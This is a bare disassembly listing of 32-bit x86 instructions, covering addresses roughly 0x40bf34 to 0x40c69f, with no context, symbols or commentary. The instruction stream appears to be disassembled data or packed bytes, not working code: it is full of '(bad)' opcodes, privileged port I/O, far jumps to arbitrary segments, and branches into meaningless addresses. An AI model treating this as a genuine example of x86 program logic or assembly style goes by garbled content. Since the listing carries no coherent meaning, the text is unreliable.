  40bf34:	add    al,0xcf
  40bf36:	mov    cs,WORD PTR [edx]
  40bf38:	imul   eax,DWORD PTR [edi],0xbf72129d
  40bf3e:	adc    dh,BYTE PTR [ebx+0x422ce5e9]
  40bf44:	adc    BYTE PTR [ebp-0x29],0x9a
  40bf48:	ror    bl,0x7a
  40bf4b:	mov    DWORD PTR [ecx+0x7213eee1],edi
  40bf51:	pop    edx
  40bf52:	pop    esi
  40bf53:	jg     0x40beee
  40bf55:	mov    ebx,0xd44a324f
  40bf5a:	shl    BYTE PTR [ebp-0x2ff43806],0x14
  40bf61:	mov    esi,0x931467a5
  40bf66:	bound  esi,QWORD PTR [eax+ecx*8]
  40bf69:	lods   al,BYTE PTR ds:[esi]
  40bf6a:	mov    ebx,0xe548f182
  40bf6f:	arpl   WORD PTR [esp+ebx*8+0x2bc73a47],ax
  40bf76:	sbb    BYTE PTR ds:0x47004230,dl
  40bf7c:	daa    
  40bf7d:	sub    ecx,DWORD PTR [edi]
  40bf7f:	out    dx,eax
  40bf80:	test   DWORD PTR [ebp-0x58],ebx
  40bf83:	lock cmp DWORD PTR [edx+0x23],ebp
  40bf87:	mov    edx,0x8e9f16a3
  40bf8c:	clc    
  40bf8d:	shr    DWORD PTR [esi+0x1e],1
  40bf90:	bound  eax,QWORD PTR cs:[ebp+ecx*2-0x5f]
  40bf95:	adc    dh,BYTE PTR [ebp+0x76]
  40bf98:	or     eax,0xa5c2b0d5
  40bf9d:	int3   
  40bf9e:	jmp    0x5313:0xdd3e65ff
  40bfa5:	lahf   
  40bfa6:	test   al,0x84
  40bfa8:	fcomp  QWORD PTR ds:[esi-0xd]
  40bfac:	sbb    al,BYTE PTR [edi-0x1fe4fd1d]
  40bfb2:	repz push ebx
  40bfb4:	leave  
  40bfb5:	xor    BYTE PTR [edx],al
  40bfb7:	ins    DWORD PTR es:[edi],dx
  40bfb8:	jns    0x40bf9b
  40bfba:	push   edx
  40bfbb:	xchg   edi,eax
  40bfbc:	jne    0x40bfeb
  40bfbe:	push   esi
  40bfbf:	jae    0x40c01a
  40bfc1:	shl    DWORD PTR [esi-0xf],cl
  40bfc4:	popf   
  40bfc5:	xor    al,0xf5
  40bfc7:	arpl   WORD PTR [eax+0x78],sp
  40bfca:	scas   eax,DWORD PTR es:[edi]
  40bfcb:	fdivr  QWORD PTR [edi]
  40bfcd:	and    BYTE PTR [eax],dl
  40bfcf:	jb     0x40bfdd
  40bfd1:	mov    dh,BYTE PTR [eax+0x11157e6c]
  40bfd7:	shr    DWORD PTR [esi],cl
  40bfd9:	mov    cl,0x56
  40bfdb:	imul   ebp,DWORD PTR [eax-0xc],0x88ba0ee7
  40bfe2:	mov    ch,0xf5
  40bfe4:	and    al,0x70
  40bfe6:	dec    esi
  40bfe7:	rcr    BYTE PTR [eax],0x57
  40bfea:	xor    al,0x8c
  40bfec:	mov    ebx,0xbf6cb6e4
  40bff1:	push   0xffffff8a
  40bff3:	add    al,0x6e
  40bff5:	pop    es
  40bff6:	lods   al,BYTE PTR ds:[esi]
  40bff7:	jg     0x40c028
  40bff9:	push   ds
  40bffa:	lahf   
  40bffb:	push   edx
  40bffc:	xor    esp,ebx
  40bffe:	adc    bl,BYTE PTR [edi]
  40c000:	ins    DWORD PTR es:[edi],dx
  40c001:	cwde   
  40c002:	inc    esi
  40c003:	jne    0x40bffa
  40c005:	xchg   di,ax
  40c007:	mov    ecx,0x307c8a00
  40c00c:	fwait
  40c00d:	scas   al,BYTE PTR es:[edi]
  40c00e:	pop    ecx
  40c00f:	in     eax,0xb4
  40c011:	mov    WORD PTR [edx+0x1f],?
  40c014:	sub    DWORD PTR [edx+0x2f],edx
  40c017:	adc    al,0x8b
  40c019:	sbb    eax,0x4b171440
  40c01e:	add    ebp,DWORD PTR gs:[ecx-0x74e0a6a6]
  40c025:	xchg   ebx,eax
  40c026:	and    ebp,DWORD PTR [ebx]
  40c028:	and    esi,edi
  40c02a:	push   edx
  40c02b:	mov    eax,0x2494e140
  40c030:	push   edx
  40c031:	dec    ebx
  40c032:	mov    ch,0xd1
  40c034:	leave  
  40c035:	xchg   ebp,eax
  40c036:	mov    ch,0xd5
  40c038:	cld    
  40c039:	pop    eax
  40c03a:	sub    dl,BYTE PTR [ecx]
  40c03c:	call   0xf09afe40
  40c041:	test   eax,0x628d111c
  40c046:	adc    eax,esp
  40c048:	mov    cl,bl
  40c04a:	or     eax,0x7baabf1d
  40c04f:	cmp    eax,0xd9d0f7ee
  40c054:	out    dx,eax
  40c055:	or     BYTE PTR ds:0x6b714520,bl
  40c05b:	and    esp,esi
  40c05d:	push   ss
  40c05e:	ror    DWORD PTR [esi-0xf],0x26
  40c062:	ds mov cl,0x9c
  40c065:	sahf   
  40c066:	mov    ds:0xeeafae81,al
  40c06b:	mov    cl,0xc6
  40c06d:	sbb    dl,BYTE PTR [eax+esi*1-0x7a880807]
  40c074:	icebp  
  40c075:	mov    ds:0xd5f426be,eax
  40c07a:	mov    ecx,0x2e017e85
  40c07f:	mov    eax,0x43d78534
  40c084:	sbb    DWORD PTR [ecx+0x79b5b2a8],ecx
  40c08a:	test   edx,esi
  40c08c:	leave  
  40c08d:	les    esp,FWORD PTR [ecx+0x35]
  40c090:	jle    0x40c087
  40c092:	pusha  
  40c093:	imul   esi,DWORD PTR [eiz*8-0x443a8fa],0xa2156c35
  40c09e:	add    eax,0x92e700b8
  40c0a3:	cld    
  40c0a4:	mov    bh,0xca
  40c0a6:	not    BYTE PTR [esi]
  40c0a8:	inc    ecx
  40c0a9:	fist   DWORD PTR [edx+0x45]
  40c0ac:	add    eax,0xe8f123da
  40c0b1:	icebp  
  40c0b2:	pop    ds
  40c0b3:	cmp    cl,dl
  40c0b5:	push   es
  40c0b6:	xlat   BYTE PTR ds:[ebx]
  40c0b7:	leave  
  40c0b8:	xchg   edx,eax
  40c0b9:	push   0x13
  40c0bb:	ret    0xd4ca
  40c0be:	je     0x40c063
  40c0c0:	or     BYTE PTR [ecx],bl
  40c0c2:	push   ebx
  40c0c3:	mov    dh,0x87
  40c0c5:	mul    ebp
  40c0c7:	mov    eax,ds:0xd3b7a7b8
  40c0cc:	faddp  st(2),st
  40c0ce:	xor    BYTE PTR [ecx+eax*2-0x6a69fced],cl
  40c0d5:	xchg   esi,eax
  40c0d6:	adc    al,0x44
  40c0d8:	in     eax,0xea
  40c0da:	sub    DWORD PTR [ebp-0x70],edi
  40c0dd:	or     DWORD PTR [ebp-0x6ac42931],edx
  40c0e3:	ss retf 0xa981
  40c0e7:	ficom  WORD PTR [edx]
  40c0e9:	fild   DWORD PTR [edx]
  40c0eb:	lahf   
  40c0ec:	int    0x1a
  40c0ee:	mov    ecx,DWORD PTR [ecx-0x42]
  40c0f1:	push   ecx
  40c0f2:	inc    ebp
  40c0f3:	mov    bh,0xe
  40c0f5:	cdq    
  40c0f6:	lock cwde 
  40c0f8:	enter  0xf05a,0x9
  40c0fc:	xchg   ecx,eax
  40c0fd:	mov    edx,0x265039c1
  40c102:	outs   dx,BYTE PTR ds:[esi]
  40c103:	dec    ebp
  40c104:	leave  
  40c105:	and    BYTE PTR [eax+eiz*8],bl
  40c108:	test   eax,0x4fcd4a51
  40c10d:	loop   0x40c139
  40c10f:	push   cs
  40c110:	push   0x1725ba1f
  40c115:	cdq    
  40c116:	pop    edx
  40c117:	xchg   al,bh
  40c119:	(bad)  
  40c11a:	addr16 inc ecx
  40c11c:	stos   BYTE PTR es:[edi],al
  40c11d:	sbb    BYTE PTR [eax-0x1ac42c74],al
  40c123:	mov    eax,0x341d59c8
  40c128:	push   cs
  40c129:	adc    eax,0x2c1ef204
  40c12e:	fld    DWORD PTR [edx+eax*8]
  40c131:	xchg   ecx,eax
  40c132:	dec    ecx
  40c133:	jl     0x40c128
  40c135:	fmul   QWORD PTR [ebx+0x3c]
  40c138:	mov    ch,0x5a
  40c13a:	push   ecx
  40c13b:	adc    eax,0x1c97418
  40c140:	pusha  
  40c141:	add    ah,dl
  40c143:	in     al,dx
  40c144:	stos   BYTE PTR es:[edi],al
  40c145:	lods   al,BYTE PTR ds:[esi]
  40c146:	mov    bl,0x16
  40c148:	mov    eax,ds:0xf4f99588
  40c14d:	sbb    bl,al
  40c14f:	push   esp
  40c150:	sti    
  40c151:	lods   eax,DWORD PTR ds:[esi]
  40c152:	retf   0xae6b
  40c155:	cdq    
  40c156:	mov    edx,0x84c17a95
  40c15b:	sbb    DWORD PTR [eax+0x7432b16f],edx
  40c161:	int3   
  40c162:	scas   al,BYTE PTR es:[edi]
  40c163:	mov    ebx,DWORD PTR [edi-0x2e]
  40c166:	arpl   WORD PTR [ebx-0x32bf993e],ax
  40c16c:	inc    esi
  40c16d:	inc    ebp
  40c16e:	adc    bh,BYTE PTR [ecx]
  40c170:	cmc    
  40c171:	mov    ch,0x71
  40c173:	adc    ch,bl
  40c175:	rcl    BYTE PTR [esi],cl
  40c177:	stos   DWORD PTR es:[edi],eax
  40c178:	mov    dh,0x47
  40c17a:	jp     0x40c1e4
  40c17c:	iret   
  40c17d:	aad    0xf7
  40c17f:	outs   dx,BYTE PTR ds:[esi]
  40c180:	add    eax,0x97da7db2
  40c185:	jb     0x40c1b0
  40c187:	mov    cl,0x10
  40c189:	mul    bh
  40c18b:	out    0x17,eax
  40c18d:	cwde   
  40c18e:	xor    ebp,edx
  40c190:	inc    DWORD PTR [ecx+esi*8-0x252a3870]
  40c197:	mov    cl,0x26
  40c199:	in     eax,0xe9
  40c19b:	js     0x40c121
  40c19d:	jno    0x40c1f9
  40c19f:	stos   DWORD PTR es:[edi],eax
  40c1a0:	cmp    esp,DWORD PTR [ebp+0x2175b2e9]
  40c1a6:	jmp    0xd02a:0xb802d53a
  40c1ad:	dec    ebx
  40c1ae:	stos   DWORD PTR es:[edi],eax
  40c1af:	das    
  40c1b0:	push   ss
  40c1b1:	dec    esp
  40c1b2:	stos   BYTE PTR es:[edi],al
  40c1b3:	pop    ds
  40c1b4:	test   al,0x45
  40c1b6:	lds    eax,FWORD PTR [eax-0xbe7475b]
  40c1bc:	jge    0x40c1f8
  40c1be:	dec    eax
  40c1bf:	mov    ah,0xfd
  40c1c1:	jne    0x40c180
  40c1c3:	add    DWORD PTR [esi-0x2],ecx
  40c1c6:	cs inc eax
  40c1c8:	dec    ecx
  40c1c9:	cmp    eax,0xa04627a0
  40c1ce:	add    DWORD PTR [esp+eax*8-0x4b],esp
  40c1d2:	fmul   DWORD PTR [esi-0x4e]
  40c1d5:	push   ecx
  40c1d6:	aad    0x5
  40c1d8:	xchg   DWORD PTR [edi],eax
  40c1da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1db:	add    al,0xe2
  40c1dd:	cli    
  40c1de:	adc    BYTE PTR [ebx+0x6f8611c0],ah
  40c1e4:	loopne 0x40c1f0
  40c1e6:	ror    BYTE PTR [esi-0x21],cl
  40c1e9:	icebp  
  40c1ea:	jmp    0x1ac1a157
  40c1ef:	into   
  40c1f0:	ficom  WORD PTR ds:0xac31cf7a
  40c1f6:	and    DWORD PTR [eax-0x2f17771e],edx
  40c1fc:	js     0x40c206
  40c1fe:	mov    esi,0xbe4af0d
  40c203:	inc    esp
  40c204:	mov    ebp,0xad54c5b5
  40c209:	repz cmp DWORD PTR [esi+edx*8],eax
  40c20d:	inc    edx
  40c20e:	mov    esi,0xe5c0afc1
  40c213:	and    al,BYTE PTR [eax+0x4d663670]
  40c219:	into   
  40c21a:	pop    ss
  40c21b:	and    dh,BYTE PTR [ecx+ebx*2]
  40c21e:	inc    esi
  40c21f:	ret    
  40c220:	jg     0x40c259
  40c222:	js     0x40c263
  40c224:	ja     0x40c234
  40c226:	jge    0x40c1bc
  40c228:	imul   ecx,eax,0x87bb4207
  40c22e:	stos   BYTE PTR es:[edi],al
  40c22f:	repnz retf 
  40c231:	add    eax,0xa8cc1002
  40c236:	jno    0x40c297
  40c238:	mov    ecx,DWORD PTR [ecx+0x5e]
  40c23b:	inc    ebx
  40c23c:	cmp    eax,0x76ec7c23
  40c241:	push   cs
  40c242:	sub    cl,bh
  40c244:	nop
  40c245:	mov    ebp,0x3a133f8d
  40c24a:	mov    edx,0x6c0b10cc
  40c24f:	jmp    0x259d45d5
  40c254:	popa   
  40c255:	out    0xce,eax
  40c257:	aad    0x2a
  40c259:	cmp    edi,DWORD PTR [ebx+ebx*4-0x1a]
  40c25d:	sbb    ah,BYTE PTR [ebp+0x18]
  40c260:	or     al,0x28
  40c262:	sbb    DWORD PTR [eax],0x1cf6d039
  40c268:	outs   dx,DWORD PTR ds:[esi]
  40c269:	push   esp
  40c26a:	stc    
  40c26b:	clc    
  40c26c:	xchg   dl,bl
  40c26e:	loop   0x40c1f1
  40c270:	loope  0x40c295
  40c272:	inc    esi
  40c273:	dec    edi
  40c274:	fild   WORD PTR [esi]
  40c276:	jmp    0x369c:0x8544246d
  40c27d:	cmp    al,0x65
  40c27f:	addr16 popa 
  40c281:	rcr    dh,1
  40c283:	lock sar DWORD PTR [edi],0xf7
  40c287:	mov    ebp,0x1fb00ab7
  40c28c:	shr    ebp,1
  40c28e:	push   edx
  40c28f:	popf   
  40c290:	(bad)  
  40c291:	jge    0x40c273
  40c293:	mov    bl,0x27
  40c295:	neg    BYTE PTR [eax+eiz*2-0x4256d9a1]
  40c29c:	mov    cl,0xbe
  40c29e:	jns    0x40c305
  40c2a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2a1:	les    edi,FWORD PTR [esi]
  40c2a3:	jmp    0x40c227
  40c2a5:	xor    esi,DWORD PTR es:[edx+edi*2-0x54eb3b51]
  40c2ad:	mov    ds:0x32c1944f,eax
  40c2b2:	push   ebp
  40c2b3:	rcl    DWORD PTR [eax-0x4f],0x20
  40c2b7:	cwde   
  40c2b8:	inc    ebx
  40c2b9:	or     DWORD PTR [edi+ebx*8-0x62],ebp
  40c2bd:	xor    BYTE PTR [eax+0x45c1686a],al
  40c2c3:	fs int 0x80
  40c2c6:	xchg   edx,eax
  40c2c7:	hlt    
  40c2c8:	loopne 0x40c291
  40c2ca:	jno    0x40c26c
  40c2cc:	lods   al,BYTE PTR ds:[esi]
  40c2cd:	les    edi,FWORD PTR [edi+eiz*8+0x49088bf3]
  40c2d4:	sub    al,0xb9
  40c2d6:	pop    ebp
  40c2d7:	bound  edx,QWORD PTR [eax-0x5866e5fc]
  40c2dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2de:	mov    edx,0xb2b4a2d3
  40c2e3:	xor    bh,ch
  40c2e5:	nop
  40c2e6:	lds    esp,FWORD PTR [eax]
  40c2e8:	stc    
  40c2e9:	call   0x95358f15
  40c2ee:	popf   
  40c2ef:	xor    eax,0xb153a9ac
  40c2f4:	inc    ebx
  40c2f5:	mov    esp,0x83ac2623
  40c2fa:	sar    BYTE PTR [ecx+0x73],1
  40c2fd:	fadd   st,st(5)
  40c2ff:	mov    edi,0x66af19ab
  40c304:	adc    BYTE PTR [edi+0x798c633a],ch
  40c30a:	lahf   
  40c30b:	dec    ebx
  40c30c:	jns    0x40c30a
  40c30e:	sub    eax,0x10711fdc
  40c313:	ss push 0x6e
  40c316:	push   ebp
  40c317:	popa   
  40c318:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40c31a:	add    ebp,DWORD PTR [eax+0x68]
  40c31d:	pop    eax
  40c31e:	rol    BYTE PTR [ebx-0x24],0x52
  40c322:	inc    edx
  40c323:	lods   al,BYTE PTR ds:[esi]
  40c324:	lock dec ebp
  40c326:	fst    DWORD PTR [edi]
  40c328:	hlt    
  40c329:	fsubr  st,st(2)
  40c32b:	cmp    DWORD PTR [ebp-0x5347a73c],esi
  40c331:	shl    BYTE PTR [ebx+0x767ddfcd],1
  40c337:	sti    
  40c338:	xchg   ebx,eax
  40c339:	cld    
  40c33a:	scas   al,BYTE PTR es:[edi]
  40c33b:	sbb    edx,esi
  40c33d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c33e:	sub    edx,DWORD PTR [edx-0x1b]
  40c341:	dec    esp
  40c342:	retf   0x64ef
  40c345:	xchg   ebx,eax
  40c346:	test   eax,0x646fea0f
  40c34b:	mov    bh,0xeb
  40c34d:	pop    edx
  40c34e:	mov    DWORD PTR [edx-0x5f992cb0],edx
  40c354:	aam    0x15
  40c356:	xchg   edx,eax
  40c357:	pop    ebp
  40c358:	stos   BYTE PTR es:[edi],al
  40c359:	sub    DWORD PTR [eax],esp
  40c35b:	inc    edx
  40c35c:	out    dx,eax
  40c35d:	loope  0x40c2fa
  40c35f:	in     al,0xce
  40c361:	ins    DWORD PTR es:[edi],dx
  40c362:	jae    0x40c301
  40c364:	call   FWORD PTR [ebx-0x1609596c]
  40c36a:	xor    eax,0xdbeaa1b8
  40c36f:	scas   al,BYTE PTR es:[edi]
  40c370:	enter  0x5a0,0x75
  40c374:	(bad)  
  40c375:	cs out dx,al
  40c377:	leave  
  40c378:	push   ds
  40c379:	mov    ebx,0x94fa2fd0
  40c37e:	bound  ebx,QWORD PTR [esi+0x347fe42]
  40c384:	mov    edx,0x6c9ae8f3
  40c389:	push   ebx
  40c38a:	sbb    DWORD PTR [edi-0x3c731164],0x9e89ef4e
  40c394:	pop    edi
  40c395:	mov    esi,0xc7ac300e
  40c39a:	stos   DWORD PTR es:[edi],eax
  40c39b:	repnz imul ebp,DWORD PTR [ecx-0x5b],0xffffffc9
  40c3a0:	mov    cl,0x2c
  40c3a2:	jb     0x40c390
  40c3a4:	iret   
  40c3a5:	fwait
  40c3a6:	adc    BYTE PTR [edi+0x37],al
  40c3a9:	(bad)  
  40c3aa:	sbb    al,0xb
  40c3ac:	dec    ebp
  40c3ad:	mov    ds:0x9eb4ffe5,al
  40c3b2:	imul   edi,DWORD PTR [esi+0x13],0xffffff8e
  40c3b6:	push   ebx
  40c3b7:	fldpi  
  40c3b9:	and    DWORD PTR [edx-0x49],0x1e
  40c3bd:	leave  
  40c3be:	int3   
  40c3bf:	mov    ds:0x9f605cec,eax
  40c3c4:	add    BYTE PTR [ecx+eiz*8],0xa8
  40c3c8:	fadd   DWORD PTR [eax]
  40c3ca:	xor    al,0xd6
  40c3cc:	jmp    0xa88b:0x720b0376
  40c3d3:	lahf   
  40c3d4:	push   0xfffffffe
  40c3d6:	dec    esi
  40c3d7:	push   ecx
  40c3d8:	jb     0x40c3b6
  40c3da:	push   ecx
  40c3db:	mov    ch,0xfc
  40c3dd:	adc    BYTE PTR [ebp-0x78efd153],dl
  40c3e3:	ss and eax,edi
  40c3e6:	rcr    dh,1
  40c3e8:	mov    ah,0x4c
  40c3ea:	test   BYTE PTR [esi+0x48],0x6
  40c3ee:	stc    
  40c3ef:	jge    0x40c40e
  40c3f1:	xchg   edi,eax
  40c3f2:	jnp    0x40c3cd
  40c3f4:	in     eax,0x4f
  40c3f6:	add    cl,cl
  40c3f8:	jb     0x40c43d
  40c3fa:	popf   
  40c3fb:	pop    ds
  40c3fc:	xchg   ecx,eax
  40c3fd:	pop    edi
  40c3fe:	mov    bh,0xcd
  40c400:	sub    al,0x6d
  40c402:	dec    esi
  40c403:	inc    ebp
  40c404:	pop    eax
  40c405:	fcomp  QWORD PTR [edi-0x60]
  40c408:	mov    gs,WORD PTR [ecx]
  40c40a:	sbb    eax,DWORD PTR [ebx]
  40c40c:	lahf   
  40c40d:	out    0x1a,eax
  40c40f:	ror    al,1
  40c411:	dec    edx
  40c412:	inc    ecx
  40c413:	xchg   esi,eax
  40c414:	jl     0x40c3f1
  40c416:	mov    cl,0x74
  40c418:	(bad)  
  40c41a:	retf   0xc981
  40c41d:	call   0xd175:0x99537fc9
  40c424:	shl    BYTE PTR [ebx],cl
  40c426:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c427:	ret    0x1255
  40c42a:	sbb    BYTE PTR [ecx],bh
  40c42c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c42d:	sub    BYTE PTR [ecx+0x54e171de],bl
  40c433:	inc    ebx
  40c434:	push   es
  40c435:	retf   0xa61
  40c438:	inc    BYTE PTR [eax+0x9beab8a]
  40c43e:	dec    ecx
  40c43f:	push   esi
  40c440:	mov    al,ds:0x6246ef18
  40c445:	cwde   
  40c446:	mov    al,0x45
  40c448:	sbb    BYTE PTR [esi+0x72],bl
  40c44b:	inc    edx
  40c44c:	push   eax
  40c44d:	lds    esp,FWORD PTR [esi]
  40c44f:	(bad)  
  40c450:	loop   0x40c436
  40c452:	mov    dh,0x49
  40c454:	sar    BYTE PTR [esi+0x7b],cl
  40c457:	dec    edx
  40c458:	jbe    0x40c4a8
  40c45a:	xor    al,ah
  40c45c:	jmp    0xc97c34e9
  40c461:	nop
  40c462:	in     eax,dx
  40c463:	jl     0x40c43e
  40c465:	lods   eax,DWORD PTR ds:[esi]
  40c466:	fiadd  WORD PTR [edi+0x5a1825fb]
  40c46c:	dec    esi
  40c46d:	icebp  
  40c46e:	xchg   edx,eax
  40c46f:	and    DWORD PTR [eax+0x2e],eax
  40c472:	or     ah,BYTE PTR [edi]
  40c474:	and    esi,0xa0c1cd9c
  40c47a:	ret    
  40c47b:	rcr    DWORD PTR [eax+0x6c],1
  40c47e:	pop    edi
  40c47f:	xchg   ecx,eax
  40c480:	scas   al,BYTE PTR es:[edi]
  40c481:	test   eax,0xaa9780d8
  40c486:	jle    0x40c4c9
  40c488:	jnp    0x40c47b
  40c48a:	adc    al,0xb9
  40c48c:	xor    al,0xb1
  40c48e:	mov    ecx,eax
  40c490:	loop   0x40c4b5
  40c492:	jns    0x40c4ab
  40c494:	xlat   BYTE PTR ds:[ebx]
  40c495:	and    bh,BYTE PTR [ebx]
  40c497:	mov    dl,0x88
  40c499:	rcl    esp,cl
  40c49b:	mov    esp,0x492365fc
  40c4a0:	inc    DWORD PTR [edx-0x5459ef55]
  40c4a6:	test   BYTE PTR [esi+0x14d45d02],bh
  40c4ac:	bound  ebp,QWORD PTR [ebp+0x50ff255b]
  40c4b2:	lods   al,BYTE PTR ds:[esi]
  40c4b3:	pusha  
  40c4b4:	sub    al,ah
  40c4b6:	jb     0x40c4fd
  40c4b8:	add    al,0x83
  40c4ba:	test   al,0x55
  40c4bc:	adc    ebp,DWORD PTR [edi]
  40c4be:	jae    0x40c469
  40c4c0:	cmp    al,0x72
  40c4c2:	pop    esi
  40c4c3:	loop   0x40c4d6
  40c4c5:	mov    ch,BYTE PTR [esp+eax*4]
  40c4c8:	retf   0x819
  40c4cb:	xchg   ebx,eax
  40c4cc:	ret    
  40c4cd:	push   ebp
  40c4ce:	pop    edx
  40c4cf:	call   DWORD PTR [eax]
  40c4d1:	loop   0x40c486
  40c4d3:	mov    esp,esi
  40c4d5:	rol    DWORD PTR [edx+0x6b],cl
  40c4d8:	push   eax
  40c4d9:	enter  0x7f69,0xaa
  40c4dd:	pop    edi
  40c4de:	sub    DWORD PTR [edi+0x62],ebp
  40c4e1:	pusha  
  40c4e2:	out    dx,al
  40c4e3:	push   edi
  40c4e4:	mov    ebx,DWORD PTR [edx+0x5]
  40c4e7:	imul   ebx,DWORD PTR [ecx-0x2d],0xdc9fd154
  40c4ee:	aas    
  40c4ef:	mov    eax,ds:0x65c3a9f5
  40c4f4:	js     0x40c4db
  40c4f6:	ja     0x40c506
  40c4f8:	nop
  40c4f9:	in     eax,0xcb
  40c4fb:	inc    ebx
  40c4fc:	xchg   BYTE PTR [edx],ch
  40c4fe:	mov    dl,0xb7
  40c500:	jle    0x40c507
  40c502:	ins    DWORD PTR es:[edi],dx
  40c503:	sub    ch,cl
  40c505:	or     bl,al
  40c507:	test   BYTE PTR ds:0xc082cdc2,bl
  40c50d:	mov    BYTE PTR [ebx],bh
  40c50f:	and    eax,0xfb7ae408
  40c514:	and    al,0x3e
  40c516:	sbb    dl,BYTE PTR [edx-0x5c]
  40c519:	lods   al,BYTE PTR ds:[esi]
  40c51a:	cli    
  40c51b:	scas   eax,DWORD PTR es:[edi]
  40c51c:	and    BYTE PTR [esp+edx*1],bl
  40c51f:	mov    cl,0xf0
  40c521:	(bad)  
  40c522:	out    0xb0,al
  40c524:	test   eax,0xaf8ecc
  40c529:	mov    al,0x80
  40c52b:	push   cs
  40c52c:	std    
  40c52d:	cli    
  40c52e:	daa    
  40c52f:	dec    ebx
  40c530:	add    ebp,ebx
  40c532:	cmp    DWORD PTR [ecx-0x9],ebp
  40c535:	cs cmp esp,ebx
  40c538:	push   es
  40c539:	loopne 0x40c5a1
  40c53b:	inc    ecx
  40c53c:	cdq    
  40c53d:	lock push esi
  40c53f:	(bad)  
  40c540:	inc    ebp
  40c541:	(bad)  
  40c542:	icebp  
  40c543:	and    esi,ecx
  40c545:	fadd   QWORD PTR [ecx+eax*8+0x39ed1f8]
  40c54c:	dec    edi
  40c54d:	sbb    al,0x75
  40c54f:	aas    
  40c550:	cdq    
  40c551:	das    
  40c552:	push   esp
  40c553:	and    al,0xf2
  40c555:	dec    edi
  40c556:	sbb    DWORD PTR [esi-0x6e],esp
  40c559:	mov    WORD PTR [ebp+0x1f],?
  40c55c:	xchg   edx,eax
  40c55d:	pop    es
  40c55e:	jb     0x40c57a
  40c560:	test   edi,edx
  40c562:	popf   
  40c563:	mov    ah,0x4e
  40c565:	loope  0x40c524
  40c567:	xchg   ebp,eax
  40c568:	je     0x40c51d
  40c56a:	out    dx,eax
  40c56b:	stos   DWORD PTR es:[edi],eax
  40c56c:	pop    eax
  40c56d:	into   
  40c56e:	jbe    0x40c5d1
  40c570:	adc    esi,edx
  40c572:	xchg   edx,eax
  40c573:	je     0x40c5be
  40c575:	mov    dh,0xf9
  40c577:	cwde   
  40c578:	pop    ebp
  40c579:	mov    esp,0xdc6447a2
  40c57e:	add    eax,ebx
  40c580:	mov    ecx,0xe070b9f2
  40c585:	push   0x7fa2a8e6
  40c58a:	xchg   ebp,eax
  40c58b:	xchg   ebx,eax
  40c58c:	add    dl,BYTE PTR [ebp-0x1]
  40c58f:	cld    
  40c590:	cmc    
  40c591:	ficom  DWORD PTR ds:0x27e7683b
  40c597:	mov    ds:0x18290cda,al
  40c59c:	push   edi
  40c59d:	stos   BYTE PTR es:[edi],al
  40c59e:	sbb    BYTE PTR [eax],0xdd
  40c5a1:	ds popa 
  40c5a3:	in     al,0xce
  40c5a5:	idiv   DWORD PTR [esi]
  40c5a7:	call   0xd82f08a4
  40c5ac:	add    ah,BYTE PTR [eax-0x6be41cfa]
  40c5b2:	mov    ebx,0x39959597
  40c5b7:	fwait
  40c5b8:	retf   
  40c5b9:	call   0xd244:0x6a210e70
  40c5c0:	scas   al,BYTE PTR es:[edi]
  40c5c1:	xor    eax,0x33bd0313
  40c5c6:	clc    
  40c5c7:	xor    esp,ebx
  40c5c9:	or     bl,bl
  40c5cb:	sub    al,BYTE PTR [esi+0xbbb2a0d]
  40c5d1:	dec    edi
  40c5d2:	stc    
  40c5d3:	stos   BYTE PTR es:[edi],al
  40c5d4:	add    ecx,edi
  40c5d6:	mov    ch,ch
  40c5d8:	sbb    eax,0x769c5f24
  40c5dd:	mov    WORD PTR ds:0x8b274861,es
  40c5e3:	(bad)  
  40c5e4:	adc    al,0xf6
  40c5e6:	mov    edx,0xbc334ae3
  40c5eb:	lods   eax,DWORD PTR gs:[esi]
  40c5ed:	add    esi,DWORD PTR [edx-0x14de0088]
  40c5f3:	loopne 0x40c5a6
  40c5f5:	pop    eax
  40c5f6:	imul   ebx,DWORD PTR [ebx+0x2a],0x7825475b
  40c5fd:	jge    0x40c61f
  40c5ff:	cmp    eax,0x8d7a8faf
  40c604:	jge    0x40c599
  40c606:	sbb    DWORD PTR ds:[eax-0x5d42efa],edi
  40c60d:	repz adc al,0x79
  40c610:	adc    al,0x9d
  40c612:	imul   edi,DWORD PTR [edi-0x76e92df2],0x133739dd
  40c61c:	push   ebx
  40c61d:	popa   
  40c61e:	gs pop eax
  40c620:	lods   eax,DWORD PTR gs:[esi]
  40c622:	fild   WORD PTR [eax+esi*1]
  40c625:	adc    al,0x7c
  40c627:	call   0x634d:0x30242910
  40c62e:	stos   BYTE PTR es:[edi],al
  40c62f:	jl     0x40c5cb
  40c631:	mov    bh,0xcc
  40c633:	addr16 gs or bl,0x52
  40c638:	cmp    eax,ecx
  40c63a:	fcom   DWORD PTR [edx]
  40c63c:	mov    edx,0xefc4a77d
  40c641:	inc    ebx
  40c642:	lods   eax,DWORD PTR ds:[esi]
  40c643:	pop    eax
  40c644:	sbb    bl,BYTE PTR [eax]
  40c646:	hlt    
  40c647:	into   
  40c648:	test   DWORD PTR [edi+esi*4-0x5daf769e],0x12451466
  40c653:	mov    esi,0x8bf40aff
  40c658:	test   al,0x23
  40c65a:	ds xchg esi,eax
  40c65c:	or     edx,DWORD PTR [ecx]
  40c65e:	repnz add al,0x2c
  40c661:	sar    BYTE PTR [ebp+0x4],cl
  40c664:	test   BYTE PTR [ebp+0x1f],0x68
  40c668:	xor    ch,BYTE PTR [esi+0x7a068ddc]
  40c66e:	ret    0x6f23
  40c671:	or     ch,BYTE PTR [esi-0x3f]
  40c674:	nop
  40c675:	pop    ebp
  40c676:	pop    esp
  40c677:	jno    0x40c66d
  40c679:	sbb    al,0x81
  40c67b:	pop    edi
  40c67c:	jp     0x40c653
  40c67e:	mov    ecx,0xd228b111
  40c683:	jp     0x40c6b0
  40c685:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c686:	lea    ecx,[esi+0x4e]
  40c689:	dec    esp
  40c68a:	lods   al,BYTE PTR ds:[esi]
  40c68b:	clc    
  40c68c:	aam    0x6
  40c68e:	mov    al,0x64
  40c690:	pop    edx
  40c691:	rol    WORD PTR [ebp+0x5143e459],0x9a
  40c699:	test   eax,0xb97687dd
  40c69e:	int3   
  40c69f:	cwde   
